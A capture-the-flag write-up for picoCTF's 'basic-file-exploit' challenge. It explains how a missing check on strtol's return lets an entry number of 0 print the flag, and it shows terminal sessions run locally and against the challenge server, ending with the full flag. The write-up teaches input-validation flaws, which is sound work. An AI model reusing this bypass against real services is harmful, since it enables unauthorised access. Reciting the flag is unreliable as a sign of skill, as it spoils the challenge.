# `basic-file-exploit`

https://play.picoctf.org/events/70/challenges/challenge/252

## Description

The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!

Connect to the program with netcat:
```bash
nc saturn.picoctf.net 52682
```

The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/537/program-redacted.c).


## Compile and Test

Let's download and compile the program using [`compile.sh`](../../../../../c/compile_c.sh):

```bash
wget https://artifacts.picoctf.net/c/537/program-redacted.c

compile.sh program-redacted.c
```

Testing binary out, we can see that there's a menu where we can type a choice to (1) insert some data, (2) read some data and (3) exit the program.




If we look at the program source code, we can see that the flag will be printed out to the console when the following condition is met:

```bash
grep "flag" program-redacted.c -B1 | tail -2
```
```c
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
```

So what we need to do is make sure that the expression `strtol(entry, NULL, 10)` is equal to 0.

`strtol` is a function that converts a string to a long integer value and has the following declaration:

```c
long int strtol(const char *str, char **endptr, int base)
```


The first argument is the actual string where the number can be found.

The second argument is a pointer to the remaining string after the number has been extracted from the first argument. 

The third argument is the base (binary, octal, decimal, hexadecimal).

Now that we understand what the `strtol` function does, we can see that we're going to convert the `entry` into a base 10 integer and set it to the `entry_number` variable. The `if` condition checks if `entry_number` is 0.

This essentially means that we need to feed number `0` into the program when it's asking us for the entry number.

Trying that, we see that there's validation if we haven't yet entered any data into the program (option 1):


```bash
./program-redacted-32
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
2
No data yet
```

Let's try to first enter some dummy data:

```
./program-redacted-32
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
Please enter your data:
give me the flag
Please enter the length of your data:
1
Your entry number is: 1
Write successful, would you like to do anything else?
2
Please enter the entry number of your data:
0
[REDACTED]
```

Great, so we see that this works locally!

Running the same sequence of inputs on the actual CTF server, we get the actual flag:


```bash
‚ùØ nc saturn.picoctf.net 52682
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
give me the flag
give me the flag
Please enter the length of your data:
1
1
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_038A9E95}
```